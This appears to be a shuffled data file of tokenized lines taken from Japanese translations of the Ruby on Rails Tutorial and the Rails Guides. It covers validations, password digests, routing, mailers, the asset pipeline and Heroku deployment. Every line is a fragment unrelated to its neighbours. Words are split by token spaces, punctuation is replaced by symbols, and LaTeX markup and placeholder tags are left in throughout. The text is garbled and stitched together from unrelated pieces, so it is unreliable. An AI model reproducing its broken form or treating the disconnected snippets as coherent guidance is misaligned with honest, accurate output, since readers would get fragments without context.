▁ プロファイル には 、 図 \ ref { fig : profile _ follow _ button } および 図 \ ref { fig : profile _ unfollow _ button } のように それぞれ ▁[ Follow ] 、[ Unfollow ] ▁ ボタン が表示されます 。
▁self を省略した 結果を リスト \ ref { code : carrier _ w a ve _ configuration } に示します 。
▁たとえば 、 この コンソール セッション で ネイティブ の Ruby オブジェクト に \ k ode { send } メソッド を実行して 、 配列 の長さ を得る とします 。
▁ ╼╼% ▁subsection ▁user _ destroy _ tests ▁( end )╼╼ ▁% ▁section ▁ deleting _ users ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : updating _ and _ deleting _ users _ co nclusion }╼╼
▁<%= ▁render ▁partial : ▁" customer ", ▁object : ▁@ new _ customer ▁%>
▁ パスワードを 除 外 する アプリケーション フィルタ を追加する には ` config / initializers / filter _ param eter _ logging ▖ rb ` を ` config ▖ filter _ parameters += [: password ]` に追加します 。
▁この コードを じ っ く り 調 べ てみると 、 実に 奇 妙 な つ く り になっています ▟ bcrypt で 暗号化 された パスワードを 、 トークン と 直接 比 較 しています ▟ ということは 、\ emph {==} で 比 較 する 際に ダイジェスト を \ k ode { 復 号 化 } している のでしょうか 。
▁以上で CDN サーバー の設定 が 終わり ました ので 、 今度は ブラウザ に対して 、 Rails サーバー に 直接 アクセス する の ではなく 、 CDN から アセット を取得する ように 通知 する必要があります 。
▁ このコード では 、 記憶トークン で使用した トークン の メソッド や ダイジェスト の メソッドを スト レ ート に 使い ま わ しています ▟ リスト { p 0} の {2} remember {/2} メソッドと 比 べ てみましょう 。
▁d ▖ next _ year ▁# ▁=> ▁Sun , ▁ 08 ▁May ▁2011
▁` PATCH ` ▁verb に関する 追加 情報 ▁[ ` PATCH ` では 異なる メディアタイプ を使用する 必要がある ]( http :// www ▖ rfc - edit or ▖ org / er r at a _ search ▖ ph p ? rfc = 57 89 )▟ [ JSON ▁Patch ]( http :// to ol s ▖ i e t f ▖ org / html / rfc 6 9 02 ) ▁ など が 該 当 します ▟ Rails は JSON ▁Patch を ネイティブ では サポート しません が 、 サポート は 簡単に 追加 できます 。
▁{0} 図 1 ▖ 11 {/0} {1} 見 事 な Heroku の インターフェイス ▟\ href { http :// railstutorial ▖ org / images / figures / heroku _ info _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ 現時点では 、 新しいマイクロポスト の作成 は 図 \ ref { fig : micropost _ created } で示した ように 期待どおり に 動作 しています 。
▁client ▁= ▁Client ▖ first (3)
▁\ k ode { co } コマンド エイリアス を設定し て い なくても 動作する ように 、 本チュートリアル では \ k ode { checkout } コマンド を使用する ようにしています が 、 著者 は 普 段 から \ k ode { git ▁co } だけ を 常に 使 っています )
▁最後に 、\ emph { Ruby ▁on ▁Rails チュートリアル } を 読み 終 え た 経験 豊 富 な プログラマ の方 には 、 さらに 高度な 話 題 を 扱 っている 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist }}」( David ▁A ▖ ▁B la c k ▁ 著 ) ▁ または 「\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby }}」( Russ ▁O l s en ▁ 著 ) ▁ を お勧め します ▟ あるいは 、 トピック 別 に 書かれてい る 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way }}」( H al ▁F ul to n ▁ 著 ) ▁ を 読んで み る の も 良い でしょう 。
▁ 作業 内容 の一部 に 少し ばかり 高度な 部分 も 含まれています が 、 今 はすべて を 理解 しておく 必要はありません ので ご 安 心 ください ▟ 今 大 事 な のは 、 この章 の 終わり まで 手順 を進める ことで 、 作成した アプリケーションを 実際の Web サービス として デプロイ することです 。
▁** 楽 観的ロック カラム **
▁上のコード の 出力 は 以下のような もの になります 。
▁\ emph { 本書 } を 読み 終 わ る 頃 には 、 自分の 手 で Web アプリケーションを開発する ための 技術 のみ な らず 、 デプロイ ( deploy : ▁ 本番環境で アプリ を 動 か し 、 一 般 公開 すること ) を行なう ための 技術 も すべて 習 得 できます 。
▁ インスタンス変数 は 常に \ k ode {@ } 記 号 で 始 まり 、 未 定義 の状態 では 値が \ k ode { nil } になります 。
▁ フィクスチャ で \ k ode { user } 変数 を定義する
▁Client ▖ where ( first _ name : ▁' Lifo ')▖ take
▁ 有効な User かどうか をテストする
▁なお 、\ emph { Rails チュートリアル } では 、\ k ode { \_ path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ k ode { \_ url } 書 式 を使用します 。
▁\ k ode { where } メソッド 内の 変数 に 、 キー と 値 の ペ ア を使う
▁ ╼ ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁ MySQL アダプタ ー を使用すると 、 以下の 設定 オプション が 1 つ 追加 されます 。
▁以下の 最初の 行 は 、
▁ 特定の 条件 を 満 た す 場合にのみ バリデーション を実行し たい場合 があります 。
▁` secrets ▖ yml ` ファイルを ` config ` フォルダ 内に 作成し 、 以下の 内容 を追加します 。
▁* ▁` ENV [" RAILS _ C A C H E _ ID "] ` と ` ENV [" RAILS _ A P P _ VERSION "] ` は 、 Rails の キャッシュ を扱う コード で 拡張 キャッシュ を 生成 するために使用されます 。
▁Rails の コントローラは 必ず \ k ode { Application Controller } を継承し ているので 、 Application コントローラ で定義した ルール は 、 アプリケーションの すべての アクションに 反映され ます 。
▁### ▁` has _ many ` 関連付け の詳細
▁ 既に この 共有 フォルダ を使用している のであれば 、 独自の デプロイ 用 タスク を作成する必要があります 。
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁post ed _ at ▁DESC
▁ただし 、` form _ for ` を使用して リソース を更新し ており 、` PUT ` ▁HTTP メソッド を使用する カスタム ルーティング と 連 動 している のであれば 、 変更 が必要です 。
▁しかし 、 よく 書かれた テストは 一 貫 した ストーリー の ようになり 、 人 間 にとって 理解 し やすい です ▟ ストーリー を 独立した 場 面 ごとに 分割 されてしまう と 、 物 語 調 では なくなってしまいます 。
▁この 順序 をテストするために 、 次のように マイクロポスト をいくつか 作成 しておきます 。
▁# ▁Rails ▁3▖1 から jQuery が デフォルトの JavaScript ライブラリ になる
▁Rails の メイラー は 、 ビューの レンダリング と 本質的に 同じ ことを 行 っています 。
▁### ▁button _ to
▁ユーザーの サインアウト をテストする 。
▁<% ▁end ▁%>
▁次に d if f を 展開 します 。
▁< section >
▁ メールアドレスを ユーザー名 にした ことで 、 ユーザー 同士 で 通 信 できるように 拡張 できる 可能性 が 開 か れ ます ▁({0}{1} 第 10 章 {/1}{/0} ) 。
▁" hello "▖ to (10) ▁# ▁=> ▁" hello "
▁これ に対応する アプリケーションコード を作成する には 、\ k ode { belongs _ to } リレーションシップ を 普 段 と同様に 作成します 。
▁この節では 、 その サインアウト 機能 を追加します 。
▁上の 変更 を行なう ことで 、 あ た か も エンジン が アプリケーション の一部 である か のように 、 エンジンの コントローラで ` Application Controller ` にアクセス できるようになります 。
▁\ k ode { user } と 紐 付け た 新しい Relationship オブジェクト を返す
▁config ▖ active _ record ▖ schema _ format ▁= ▁: ruby
▁╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : activation _ resets _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁ K eep - A li ve : ▁time out = 15 , ▁ max = 1 00 ▁ リダイレクト 先 の ページ として 表示される ]
▁# ▁=> ▁Sun ▁Mar ▁28 ▁0 3 :00:00 ▁+0200 ▁2010
▁ 接続 できない 場合は 、` development ` セクション の ユーザー名 または パスワードを 適切な もの に変更し てください 。
▁config ▖ action _ mailer ▖ delivery _ method ▁= ▁: sendmail
▁上のコードは 以下を実行し ます 。
▁ maximum : ▁ 400 ,
▁NOTE : ▁Rails で データ 保存 用に SQLite 3 データベース が 採 用 されている のは 、 設定 なしで すぐに 使用できる からです 。
▁#### ▁ アプリケーションの コントローラ を使用する
▁S P 1, ▁ Firefox ▁ v 2▖0▖ 0▖5 ▁and ▁O pe ra ▁ 9 ▖ 5 ▖ ▁ Safari はまだ この フラグ を 検 討 中 であり 、 この オプションは 無視 されます 。
▁`: instance _ accessor ` を ` false ` に設定する と 、 モデルの 属性 設定 時に マスアサインメント を 防止 するのに 便利です 。
▁` has _ and _ belongs _ to _ many ` 関連付け は 、 他 方のモデル と 「 多 対 多 」 の つながり を作成します が 、` through : ` を 指定した 場合 と異なり 、 第 3 の モデル ( 結合 モデル ) が 介 在 しません ( 訳 注 : ▁ 後 述 する ように 結合 用の テーブル は 必要です ) 。
▁ 実際 、` c attr _ * ` マクロ は単なる ` m attr _ * ` マクロ の別名 です 。
▁ 結果を リスト \ ref { code : length _ validation _ test } に示します 。
▁| ▁| ▁5 11 ▁| ▁: net work _ authentication _ require d ▁|
▁validates ▁: name , ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ }
▁=> ▁" user @ example ▖ com "
▁m attr _ accessor ▁: load ed
▁ここでは ビューの \ k ode { < title > } タグ の内容を 変更します 。
▁ ある アプリケーションの ` User ` モデルに ログイン 情報 があり 、 それ に関連する 名前 などの 情報 は ` Pro file ` モデルに あるとします 。
▁User モデル に対して \ k ode { has \_ secure \_ password } を追加する 利 点 は \ ref { sec : creating _ and _ authenticating _ a _ user } で 少しだけ 説明します が 、 ▁ その前に 、 パスワード の 最 小文字 数 を設定する 方法 について説明します 。
▁このオプション を使用する場合 は 、 必ず `: content _ type ` オプション も 指定 してください 。
▁=> ▁" foo @ bar ▖ com "
▁Active ▁Record を使うと 、 データモデル を作成 したり 操作 したり するための 多数の メソッドが 使えるように なる
▁ バグ レポート を送信し て 既存の 問題 解決 を 手 伝 った り 、 コード を書いて Ruby ▁on ▁Rails に 貢献 したり するためには 、 ぜ ひ とも テストスイート を 実行 できるように しておく必要があります 。
▁今度は ID が 無効な 場合 ▁( = ユーザーが 存在しない 場合 ) ▁ にも メソッドは 例外を発生 せず 、\ k ode { nil } を返します 。
▁ ブロック が 渡された 場合は yield します 。
▁\ ref { sec : logging _ in } で 完了 した ログイン システム は 、 それ 自体 で 十分 完 結 した 機能 です ▟ しかし 多くの Web サイト では 、 ブラウザを閉じ た 後に も セッションを 継 続 する 機能 など を追加 している のが普通です 。
▁上のルーティングは ` photos / 12 ` や ` / photos / long / path / to / 12 ` にマッチし 、` params [: other ]` には ` " 12 " ` や ` " long / path / to / 12 " ` が設定され ます 。
▁ いつものように 、 以下を実行して テストスイート が ▁\ passing \ ▁になることを確認 してから先に進 みましょう 。
▁OS ▁X 用の ネイティブ クライアント としては \ href { http :// col lo q u y ▖ info /}{ Co ll o q u y } と \ href { http :// li me cha t ▖ net / ma c /}{ L i me C h at } がお勧めです 。
▁default ▁from : ▁' notification s @ example ▖ com '
▁` config ▖ active _ record ` には 多くの オプション が含まれています 。
▁A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture ▖
▁ 代りに アセットパイプライン 機能を ご 利用 ください 。
▁リスト \ ref { code : layout _ new _ structure } の レイアウト はその 目的 を 果 た しています が 、 少々 散 ら か っています 。
▁* ▁` collection ▖ size `
▁create ▁test / controllers / blorgh / comments _ controller _ test ▖ rb
▁# ▁ コメント 行
▁\ k ode { String } 型 でも 2 55 文字 まで は 格 納 できる ため 、 この 型 でも \ ref { sec : micropost _ validations } で 実装 する 140 文字 制限 を 満 た せる のですが 、\ k ode { T ext } 型の 方が 表現 豊 か な マイクロポストを 実現 できます 。
▁user 	 0 m 1 ▖ 2 59 s
▁この ヘッダ のおかげで 、 アセット で 変更 が発生し ていない 場合に ブラウザ が CSS や JavaScript を リクエスト の たびに 再度 ダウンロード せずに 済み 、 非常に 有用です 。
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁` first ` メソッドで 返す レコード の 最大 数を 数値 の 引数 で 指定することもできます 。
▁上のように 特定の ファイルを 1 つ 渡す 代わりに 、 以下のように request s ディレクトリ 全体 を渡すと 、 すべての リクエスト spec の テストを実行 できる ことを 覚え ておく と 良い でしょう 。
▁| ▁| ▁50 7 ▁| ▁: in sufficient _ storage ▁|
▁Users コントローラと User モデル の関係 を さらに 考 察 するために 、 リスト \ ref { code : demo _ index _ action } で \ k ode { index } アクションを 整 理 してみ ました
▁ セキュリティ モデル を確認する ために before フィルター を コメントアウト する ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁### ▁ 結合 された テーブル で 条件 を指定する
▁これは つまり 、 以下の行 は
▁ 両者 に 違い があると すれば 、 Rails は エンジン を 一種の 「 完全な プラグイン 」 と み な している 点 です ▟ これは 、 エンジン を生成する には ジェネレータ コマンドで ` - - full ` を与える こと から も わかります 。
▁( 以前の 表示 では 、\ k ode { render ▁ ’ shared / micropost ’} のように \ k ode { : partial } パラメータ ー を省略 していました が 、\ k ode { : collection } パラメータ ー がある場合 はこの 記 法 では 正常に動作し ません ▟)
▁ 実際の インデックス ページ を作成する には 、 ユーザー を列挙し て ユーザー ごとに \ k ode { li } タグ で 囲 む ビュー を作成する必要があります 。
▁------------ --------
▁Ruby ▁1▖9 系 を使用する場合 、 Ruby ▁1▖9 ▖ 1 は あ から さ ま な セ グ メ ン テ ー ション 違 反 が発生する ため 使用できません ▟ 1▖9▖3 を ご 使用 ください 。
▁ 特に 、 以下の 値は 、
▁ ページ タイトル を カスタマイズ せずに 表示する Home ページ
▁ コード リリース 時の デプロイ が 行われ ると 、 アセット に 変更 がある かどうか にかかわらず ▁ _ すべての _ ▁ ファイルの m time ▁( 最後に 更新 された 時刻 ) ▁ が変更され てしまいます ▟ このため 、 アセット に 変更 が なくても Web ブラウザ を含む あらゆる リモート クライアント で 強制的に アセット が 再 取得 されてしまいます 。
▁== ▁Create Comments : ▁migrat ed ▁( 0 ▖ 0 1 19 s ) ▁= ============== ========= ================
▁ ブロック 内で これら を使用して データ が 正しい かどうかを 自由に チェック できます 。
▁( Windows 上で 動作する 同様 の ソ フ ト に \ href { http :// github ▖ com / ve r t ig in ous / p i k } { P i k } があります ▟)
▁<%= ▁render ▁" blorgh / comments / form " ▁%>
▁ 実は 、` save ` に ` validate : ▁false ` を 引数として 与 え ると 、` save ` のバリデーション を スキップ すること が できてしまいます 。
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁* ▁` config ▖ log _ format ter ` は Rails ロガー の フォーマット を定義します 。
▁ これはリスト \ ref { code : log _ out _ method } で使用されていました 。
▁` head ` メソッド には 、 HTTP ステータスコード を 示す 多くの シンボル を 引数として 指定 できます ▁( [ 参 照 テーブル ](# status オプション ) ▁ 参 照 ) 。
▁ Content - Type : ▁text / css
▁ では ここで マイクロポスト を追加しましょう 。
▁get ▁' welcome / index '
▁` gem ▁' spring ', ▁group : ▁: development ` ▁ を ▁` Gemfile ` に追加する
▁ メイラー が コントローラと 異なる 点 のひとつ は 、 メイラー のインスタンス は サーバー に 届 く HTTP リクエスト の コンテキスト と 無 関係 であること です ▟ アプリケーションの ホスト 情報を メイラー 内で 使用 したい場合は `: host ` パラメータ を明示的に指定 します 。
▁` comments / form ` と 書く だけで 、 Rails は 区切り の スラッシュ 文字 に 気 付き 、` app / views / comments ` ディレクトリ の ` _ form ▖ html ▖ erb ` パーシャル を 描画 すれば よい という ことを 理解 し 、 実行 してくれます ▟ ` app / views / comments / _ form ▖ html ▖ erb ` など と 書く 必要はありません 。
▁( 出力結果 が 長い ので 、 省略 された 部分を 示す ために 縦 点 を使っています ▟)
▁ オブジェクトの 個 別の 属性 について エラー がある かどうか だけ を調べ ます 。
▁ まとめると 、 {0}{1} 第 6 章 {/1}{/0} から {2}{1} 第 10 章 {/1}{/2} を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁これにより コールバック が 利用できる ので 、 ジョブ のライフサイクル の 間 に 特定の ロ ジ ッ ク を トリガ できます 。
▁このメソッドは 、 キー と 値 の いずれ についても 、 必要な 箇所 をすべて エスケープ します 。
▁ここで 、 有効化トークン と メール をそれぞれ ▁\ k ode { params [: id ]} と ▁\ k ode { params [: email ]} で 参 照 できる ▁(\ ref { sec : account _ activation _ mailer } ▁ ) ▁ ことを 思い 出 してみましょう 。
▁たとえば 4 - 0 - s table ブランチ に切り替え る 場合は 以下のように します 。
▁この 実装 結果を リスト \ ref { code : authenticated _ p } に示します 。
▁( 実は {0}{1} 第 2 章 {/1}{/0} の To y アプリケーションの Users コントローラ では テスト も 生成 されて いて 、 中 を見ると 上 と同じ コード になっています ▟)
▁ とは い え 、 今回 必要となる ア イ デ ア の ほとんど は 、\ ref { sec : showing _ all _ users } で実装した ユーザー を表示する 部分 と似ています 。
▁ オブジェクト はまだ データベースに保存 されていない ため 、 生成される SQL は 以下のような もの になります 。
▁この メッセージ を ブラウザで 表示する には 、 ユーザーの \ k ode { new } ページ で エラーメッセージ の パーシャル ▁( partial ) ▁ を出力します ▟ このとき 、\ k ode { form - control } という CSS クラス も一緒に 追加 することで 、 Bootstrap が うまく 取り 扱 っ てくれる ようになります ▟ 変更 の 結果を {1} リスト {2} 7 ▖ 18 {/2} に示します ▟ {/1}
▁( パスワード の存在 検証 と 確 認 は \ k ode { has _ secure _ password } によって自動的に 追加 されます ▟)
▁User モデル を生成する
▁# ▁If ▁the ▁argument ▁is ▁false ▁( default ▁is ▁+ nil + ), ▁the ▁context ▁is
▁ 驚 く かもしれませんが 、 上のコード では 、\ k ode { a } が 逆 転 した だけ ではなく 、\ k ode { b } まで 逆 転 されて しま っています 。
▁### ▁ 値 の 操作
▁ 同様に 、 説明 上 何らかの 人 物 を 仮 定 して 、 その 人 物 を 代 名 詞 で 呼 ぶ 場合 ▁( " a ▁user ▁with ▁a ▁session ▁cookie " ▁ など ) 、 h e や sh e のような 性 別の ある 代 名 詞 を 避 け 、 the y / the ir / the m のような 性 別 に 影 響 されない 代 名 詞 を使用すること 。
▁( カスタム 画像 を扱う 方法 については \ ref { sec : micropost _ images } で 扱 います ) 。
▁# ▁=> ▁[" Name は 以下の 文字 を含む ことはできません ▁ !
▁これらの オプションは 標準 の 方法で ローカライズ できます ▟ 使用する キー は 以下の とおり です 。
▁` require _ tree ` ディレクティブ は 、 指定された ディレクトリ 以下の ▁ _ すべての _ ▁JavaScript ファイルを 再帰的 に インクルード し 、 出力 に含め ます 。
▁GET ▁ / patients / 17
▁ エラーが表示され た Home ページ
▁ テンプレート 内の 1 つの ブロック の実行 時間 測 定 と 、 結果 の ログ出力 に 使用します 。
▁| Gemfile < br > Gemfile ▖ lock | これらの ファイルは 、 Rails アプリケーションで 必要となる gem の 依存関係 を記述し ます 。
▁ div に 続いて 、 埋め込み Ruby コードが 出 現 します 。
▁ 追 伸 ▟ エンジン 機能 は J a me s ▁A d a m 、 P io tr ▁S ar n ac k i 、 Rails コア チーム 、 そして 多くの 人 々 の 助 け なしで は でき あ が ら なかった でしょう 。
▁もし 今 の 時点 で データベースの ロールバック を実行して いた 場合は 、 先 に進む前に もう一度 以下のように マイグレーション を 適用 して 元に戻 してください 。
▁#### ▁` classify `
▁Rails ▁4▖0 では ` assets ` グループ が Gemfile から 削除 されました 。
▁ メールアドレス の 小文字 変換 に対するテスト は 演習 として 残しておきます ▁(\ ref { sec : exercises _ uniqueness _ validation }) 。
▁これ には 多くの 作業 が必要 となります が 、 幸 運 にも そう い った 作業を し なくても 済 む 方法があります ▟ それ は 、 Heroku 上で サンプルアプリケーション を 動 か し 、 Heroku の SSL 証 明 書 に 便 乗 する方法 です ▁( 訳 注 : ▁ただし 、 この 方法は Heroku の サブドメイン で のみ 有効 です ▟ 独自 ドメイン を使う 場合は SSL 証 明 書 を 購 入 する必要があります ) 。
▁\ k ode { box _ sizing } ミックスイン を リスト \ ref { code : mixin _ and _ debug } から 再 利用 し ていることに注目してください 。
▁リスト \ ref { code : user _ login _ test _ valid _ information } では 、\ k ode { post } メソッドと 有効な \ k ode { session } ハッシュ を使用して ログイン しました が 、 毎 回 このような ことを するのは 面倒 です 。
▁ 実は もうひとつ 地 味 な 問題 があります ▟ ある 理由 によって 、 テスト 内で は \ k ode { cookies } メソッドに シンボル を使用 できない のです ▟ そのため 、
▁{0} 図 8 ▖7{/0}{1} フラッシュメッセージ が 消え ずに 残 っている 例 ▟\ href { http :// railstutorial ▖ org / images / figures / flash _ persistence _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁` include _ seconds ` を true に すると 、 より 詳細な 差 を 得られます 。
▁* ▁` render ▁: body ` を実行し た場合 、 content ▁type ヘッダー は 「 設定 されない 」
▁ 日時 を 移動 する 最も 一般的な 方法は ` advance ` メソッドを使用することで す 。
▁\ emph { Sass } ▁ は 、 スタイルシート を 記 述 するための 言語 であり 、 CSS に 比 べ て 多くの 点が 強 化 されています 。
▁この 単 位 は 図 \ ref { fig : page _ flow _ profile _ mockup } のモックアップ の一部 でも 既に 使われ ていました ▟ 該 当 箇所 を 拡大 して 図 \ ref { fig : stats _ partial _ mockup } に 再 掲 します 。
▁self を省略した 結果を リスト \ ref { code : sign _ in _ helper } に示します 。
▁TIP : ▁ 特に 記 さ ない限り 、 モデル 中の ` id ` は 主キー を表し ます 。
▁ これはリスト \ ref { code : admin _ spec s } で使用されていました 。
▁これ より 古 い Ruby の サポート は 公式 に 停 止 しています 。
▁\ href { http ://0▖0▖0▖0:3000/ sessions / new }{/ sessions / new } フォームを送信すると 図 \ ref { fig : initial _ failed _ login _ rails _3} のようになります 。
▁この 作業 は 2 つ に 分ける のが 自 然 です ▟ 最初に 、 ユーザーを メールアドレス で 検索 します ▟ 次に 、 受け取った パスワード で ユーザーを 認 証 します 。
▁ これはリスト \ ref { code : remember _ me _ checkbox } で使用されていました 。
▁ 継 承 階層 を 図 \ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } に示します 。
▁Rails チーム は 、 本ガイド で ご 紹 介 した 方法で CoffeeScript と JavaScript を使用すること を 強く 推 奨 いた します ▟ 多くの JavaScript ライブラリ も この 方法で 利用できる ことが 期 待 できます 。
▁ このように 、 メソッド呼び出し での 変数 代入 を 記 憶 して 次 回 以降 の 呼び出し で 使い 回 す 手法 を \ href { http :// en ▖ w ikipedia ▖ org / wiki / M emoization }{\ emph { メ モ 化 ▁( m emoization )} } ▁ と呼びます 。
▁=> ▁" Michael "
▁ 単 一 のテスト を 個 別 に 実行 することもできます 。
▁ 呼び出し たい ` Proc ` オブジェクトを `: if ` や `: unless ` で使用する こともできます 。
▁* ▁[ Ruby プログラミング言語 公式 Web サイトの 情報 ]( https :// www ▖ ruby - lang ▖ org / ja / document ation / )
▁ クラウド IDE を お 使い の場合は 「 Go to ▁An y th ing 」 コマンド ▁( ファイル名 の一部 を入力する だけで その 場所に ジ ャ ン プ する ) ▁ が 重 宝 します 。
▁次に 、 いつものように 以下を実行し ます 。
▁\ k ode { create _ table } メソッドは ブロック 変数 を 1 つ 持つ ブロック ▁(\ ref { sec : block s }) ▁ を受け取り ます ▟ ここでは ▁( “ table ” の 頭 文字 を 取 って ) ▁\ k ode { t } です 。
▁本ガイドでは 、 コア 拡張機能 として 定義されている すべての メソッド について 、 その 定義ファイル の 置き場所 も 示 して あります 。
▁上のコードは \ emph { メソッド 参 照 } と呼ばれる もの で 、 こうすることで Rails は \ k ode { create _ remember _ token } という メソッド を探し 、 ユーザー を保存する 前に 実行 するようになります
▁上の SQL を 日本語 で 書く と 「 記事 ▁( article ) ▁ のある すべての カテゴリ ー を含む 、 Category オブジェクトを 1 つ 返す 」 となります 。
▁class ▁D ▁< ▁C ; ▁end
▁ では 、 リスト \ ref { code : generate _ user _ model } で User モデル を生成し たとき と同様に 、 Rails の \ k ode { generate ▁model } コマンド を使って Micropost モデルを 生成 してみます 。
▁#### ▁ サブディレクトリ にデプロイする 場合 の 検 討 事 項
▁" application - 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2▖ css ",
▁# ▁` mod _ expire s ` モジュール を有効に する 必要 あり
▁これにより 、 ページの コンテンツ と タイトル の両方 に ユーザーの 名前 が含まれている かどうかを テスト できます 。
▁` mail ` メソッドを トリガ ー すると 、 マルチ パ ート 形式 の メール が 1 つ 送信されます ▟ 送信される メール は 、 トップレベル が ` multipart / m i x ed ` で 最初の パ ート が ` multipart / alternative ` という 正しい 形式で ネスト している 、 プ レ ー ン テキスト メール または HTML メール です 。
▁(\ k ode { user } を \ k ode { self } に切り替え る という 手 も ある のですが 、\ k ode { self } は モデル 内で は 必 須 ではない と \ ref { sec : the _ c a ve at } で 解説 した ことを思い出しましょう ) 。
▁@ logger ▖ debug ( format _ log _ en try ( name , ▁ sql ▖ s q ue e z e (' ▁ ') ) )
▁$ ▁rake ▁ railties : install : migrations
▁` beginning _ of _ quarter ` メソッドと ` end _ of _ quarter ` メソッドは 、 レシーバの カ レ ン ダ ー の 年 における 四 半 期 の最初の 日 と 最後の 日 をそれぞれ 返します 。
▁ 私たちは この 手法 を 「 控 え め な JavaScript 」 と 呼んでいます ▟ この 名 称 は 、 HTML の中に JavaScript を 混 入 させ ない という 意図 に 由 来 しています 。
▁ 本ガイド を 活用 するための 最 善 の 方法は 、 以下の 手順を 文字 どおり 1 つ ずつ 実行 し 、 手順を 取り こ ぼ さ ないようにする ことです ▟ 取り こ ぼ し があると 、 その後 の 手順 が 期待どおり に 進 ま ない 可能性があります 。
▁ Content s
▁### ▁` new ` セグメント や ` edit ` セグメント をオーバーライドする
▁ 「 先に Ruby を 勉 強 してから Rails を学ぶ 方が 良い でしょうか ? 」 という 質 問 を よく 受 け ます 。
▁CSS や JavaScript の 圧縮 設定 には あらゆる オブジェクトを 設定 できます 。
▁\ emph { Rails チュートリアル } では これまで 配列 について 解説 していません でした が 、 配列 を理解する ことは 、 ハッシュ ▁(\ ref { sec : hashes _ and _ symbols }) ▁ や Rails の データモデル を理解する ための 重要な 基 盤 となります ▁( データモデル とは \ k ode { has _ many } などの 関連付けの こと であり 、\ ref { sec : demo _ user _ has _ many _ microposts } や \ ref { sec : user _ micropost _ associations } で 詳 しく 説明します ) 。
▁ただし 、` config / database ▖ yml ` など に置かれ る データベース接続 設定 や 、` config / secrets ▖ yml ` など に置かれ る サーバー サ イ ド の 秘密キー の セキュリティ は 保 つ ようにしてください 。
▁ すぐに も マイクロポスト 一覧 の実装 に取りかかりま す が 、 その前に 注意 すべき 点が いくつか あります 。
▁ マイクロポスト の存在 確 認 バリデーション の結果
▁({0}{1} 第 7 章 {/1}{/0} で もっと 便利な メソッドを 紹介します )
▁so cket : ▁ / t mp / mysql ▖ so c k
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 :00:00 ▁+0000
▁以上で ユーザーインデックスページ は 完全に 機能 する ようになりました ので 、 以下の テスト はすべて パスするはずです 。
▁ イニシャライザ を使用することで 、 アプリケーションの 設定 は アプリケーションが 起動 して エンジンの モデル を呼び出す まで に 完了 します ▟ この動作 は 既存の この 設定 に依存する 場合 があります 。
▁`@ employee ▖ picture s ` と すると 、 写 真 の コレクション を ` Employee ` モデルのインスタンス から 取得 できます 。
▁ ページを ブラウザで 再 表示する と 、 先に 図 に示した フォーム の例 のとおり に フォーム が表示されます 。
▁ここで 注意 し なければならない のは 、` html _ safe ` メソッド それ 自体 は 何 ら エスケープ を 行 な って いない ということです ▟ 安全 である と マ ー キ ング している に過ぎません 。
▁この章では 、 最初の アプリケーションを Heroku に デプロイ します 。
▁ 最初は 、 現在 定義されている 変数 を変更する という あり ふ れ た コード について説明します 。
▁従って 、 エンジン と アプリケーションは 、 細 か な 違い を 除 け ば ほぼ 同じ もの である と 考え ていた だ いて よいでしょう ▟ 本ガイド でも この 点を た び た び 確認し ます 。
▁最初の 例 では 、` in _ groups _ of ` メソッドは 最後の グループ を なるべく ` nil ` 要素 で 埋 め 、 指定 の サイズ を 満 た す ようにしています 。
▁Rails スタック
▁ そ のときと同様に \ k ode { password _ digest : string } という 引数 を与える ことで 、 完全な マイグレーション を生成する ための 十分 な 情報を Rails に与える ことができます ▁( リスト \ ref { code : password _ migration }) 。
▁self を省略した 結果を リスト \ ref { code : sessions _ helper _ authenticate } に示します 。
▁=> ▁" test "
▁ 典型的な マニフェストファイル の内容 は以下のような感じ になっています 。
▁### ▁` pluck `
▁ 筆者 は このような 場合 、 代入 式 全体 を かっこ で 囲 む ようにしています ▟ これが 比 較 でない ことを 思い 出 せる ように する ためです 。
▁order _ id s
▁self を省略した 結果を リスト \ ref { code : generalized _ current _ user } に示します 。
▁` video _ tag ` の場合と同様 、` audio _ tag ` にも 以下の 特 殊 オプション があります 。
▁ 正しい ス ペ ル を使用すること ▁( A rel 、 Test :: Uni t 、 RSpec 、 HTML 、 ▁ MySQL 、 JavaScript 、 ERB など )▟ 大文字 小文字 にも 注意 すること 。
▁ 対応する アプリケーションコード を作成する 。
▁### ▁` numericality `
▁リスト \ ref { code : generated _ application _ mailer } には 、 デフォルトの \ k ode { from } アドレス ▁( アプリケーション 全体 で 共通 ) ▁ があります ▟ リスト \ ref { code : generated _ user _ mailer } の各 メソッド には 宛 先 メールアドレス もあります 。
▁default _ scope は 引数に 無名 関数 ▁( - > ) ▁ を 取 る
▁ 保存 された 変数 は 、 テンプレート や レイアウト の どんな 場所 でも 自由に 使用できます 。
▁また 、 どちらも データを \ emph { 表示する } ページ なので 、 適切な HTTP メソッドは \ text tt { GET } リクエスト になります ▟ したがって 、\ k ode { get } メソッドを使って 適切な レスポンス を返す ようにします 。
